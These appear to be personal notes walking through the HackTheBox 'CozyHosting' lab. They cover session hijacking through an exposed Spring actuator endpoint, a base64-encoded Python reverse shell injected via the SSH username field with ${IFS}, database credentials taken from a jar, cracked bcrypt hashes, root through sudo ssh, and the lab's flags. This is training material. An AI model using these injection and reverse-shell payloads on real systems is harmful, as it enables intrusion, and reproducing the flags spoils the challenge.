#### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

---

#### HTTP

- no `robots.txt` file
- Found a username at 
```
|   |
|---|
|South Jakarta City 12120,|
||Jakarta, Indonesia <br><br>|
||<strong>Phone:</strong> +62 5589 55488 55<br>|
||<strong>Email:</strong> info@cozyhosting.htb<br>|
```


- Bootstrap vulns not found
- Easy admin template default creds not there

- Ferox gives this
```
200       97l      196w        0c http://cozyhosting.htb/login
200      285l      745w        0c http://cozyhosting.htb/index
401        1l        1w        0c http://cozyhosting.htb/admin
204        0l        0w        0c http://cozyhosting.htb/logout
500        1l        1w        0c http://cozyhosting.htb/error
```

- Tried to find any VHOSTS using ffuf but nothing

```
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://cozyhosting.htb/ -H 'Host: FUZZ.cozyhosting.htb' -fs 178

```


- Used writeup and found out new tool - [[Dirsearch]]
```
dirsearch -u http://cozyhosting.htb/
```

- we get a directory with session ID for username `kanderson`
```
[19:55:41] 200 -  398B  - /actuator/sessions
```

```
"3225008914AD3A3BA1E05AE47B002A09":"kanderson"}
```

- changed by `JSESSIONID` in browser console and logged in as `K. anderson`

---

#### Getting Foothold


- We note this on dashbaord
```
|   |
|---|
|or Cozy Scanner to connect the private key that you received upon registration should be|
||included in your host's .ssh/authorised_keys file.|
```

- Additional thing to note

![[Pasted image 20231227202613.png]]

- Tried the following `Hostname` and `Usernames`
```
host as 10.10.11.230

and username as anderson,root,admin
```

non worked

- Found this on `http://cozyhosting.htb/actuator/env`, so the username is probable 6 characters long. A hint maybe?
```
user.name":{"value":"******"},
```

- Also noticed that upon submission, the deatils are sent on `POST /executessh HTTP/1.1` with data as `host=localhost&username=admin`

- Also tried to use ffuf to find any usernames 
```
ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ  -u http://cozyhosting.htb/executessh -X POST -d 'host=localhost&username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H "Cookie: JSESSIONID=3225008914AD3A3BA1E05AE47B002A09" -fc 302
```
no luck

- Tried `Host:cozyadmin `  and `username:anderson`, got this error
```
#### The host was not added!

ssh: Could not resolve hostname cozyadmin: Temporary failure in name resolution
```


- Tried `host=10.10.14.89&username=admin|whoami`
```
#### The host was not added!

/bin/bash: line 1: whoami@10.10.14.89: command not foundssh: Could not resolve hostname admin: Temporary failure in name resolution
```

- Used writeup here
https://blog.213.se/cozyhosting-hackthebox/

- command injection vuln in username tab, below text explains how it may work
```
// Without -l
$ ssh -i key <username>@<hostname>
// With -l
$ ssh -i key -l <username> <hostname>
```


- Directly echoing the shellgen python paylod in base64 was not working. I have to open a text editor, paste the payload. Use `cat filename | base64` to get base64 version of payload

```
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.89",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'" | base64



cat ferox-http_cozyhosting_htb_ | base64

```

- Value i put in `username` field

```
;echo${IFS}cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0Ljg5Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsnCg==|base64${IFS}-d|/bin/bash;
```

- We get a shell as 
```
app@cozyhosting:/$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
```

---


#### Priv ESC - 1

- Only usefull thing we get is a jar file, used writeup again.

- installed .jar file viewer(Java decompiler)
```
sudo apt install jd-gui
```

- got the jar file into my system with python and opened the jar file

```
jd-gui cloudhosting-0.0.1.jar
```

- We get a set of creds
```
spring.datasource.username=postgres  
spring.datasource.password=Vg&nvzAQ7XxR
```

- used this resource https://www.youtube.com/watch?v=B6lqMnGIr-0

- Used some found postgresql commands

```
postgres=# \l - to get list of databases
```

[[Postgresql commands]]


- we get this
```
kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
```

- we get it cracked on hashes.com
```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

- we can now login as `josh:manchesterunited`

- We easily get root using `sudo ssh`

- Flags

```
josh@cozyhosting:~$ cat user.txt
cat user.txt
de5b87799486f5247c5681733b881766


cat root.txt
dc4e39c718eaf357c6cbdc6222c89686
```


---


[[port 22 and 80 are open but no leads]]

[[Potential command injections in webapp]]

